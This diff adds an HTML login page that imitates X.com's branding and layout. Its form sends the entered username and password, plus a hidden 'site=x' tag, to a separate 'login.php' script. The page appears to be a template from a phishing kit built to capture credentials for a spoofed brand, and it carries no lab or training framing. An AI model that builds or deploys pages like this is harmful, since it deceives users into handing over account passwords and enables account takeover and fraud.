@@ -1,0 +1,97 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <title>X.com Login</title>
+  <style>
+    body {
+      margin: 0;
+      font-family: Arial, sans-serif;
+      background-color: #15202b;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      color: white;
+    }
+
+    .login-container {
+      background-color: #192734;
+      padding: 40px;
+      border-radius: 12px;
+      width: 360px;
+      box-shadow: 0 8px 24px rgba(0, 0, 0, 0.5);
+      text-align: center;
+    }
+
+    .login-container h1 {
+      font-size: 36px;
+      margin-bottom: 30px;
+      font-weight: bold;
+    }
+
+    input[type="text"],
+    input[type="password"] {
+      width: 100%;
+      padding: 14px 12px;
+      margin: 12px 0;
+      border: none;
+      border-radius: 8px;
+      font-size: 16px;
+      background-color: #22303c;
+      color: white;
+    }
+
+    input::placeholder {
+      color: #8899a6;
+    }
+
+    input[type="submit"] {
+      width: 100%;
+      padding: 14px;
+      margin-top: 16px;
+      background-color: #1da1f2;
+      border: none;
+      border-radius: 8px;
+      color: white;
+      font-size: 18px;
+      font-weight: bold;
+      cursor: pointer;
+      transition: background-color 0.3s ease;
+    }
+
+    input[type="submit"]:hover {
+      background-color: #0d8ddb;
+    }
+
+    .footer-text {
+      margin-top: 20px;
+      font-size: 14px;
+      color: #8899a6;
+    }
+
+    .footer-text a {
+      color: #1da1f2;
+      text-decoration: none;
+    }
+
+    .footer-text a:hover {
+      text-decoration: underline;
+    }
+  </style>
+</head>
+<body>
+  <div class="login-container">
+    <h1>X.com</h1>
+    <form action="login.php" method="POST">
+      <input type="hidden" name="site" value="x" />
+      <input type="text" name="email" placeholder="Phone, email, or username" required />
+      <input type="password" name="pass" placeholder="Password" required />
+      <input type="submit" value="Log in" />
+    </form>
+    <div class="footer-text">
+      Forgot your password? <a href="#">Click here</a>
+    </div>
+  </div>
+</body>
+</html>
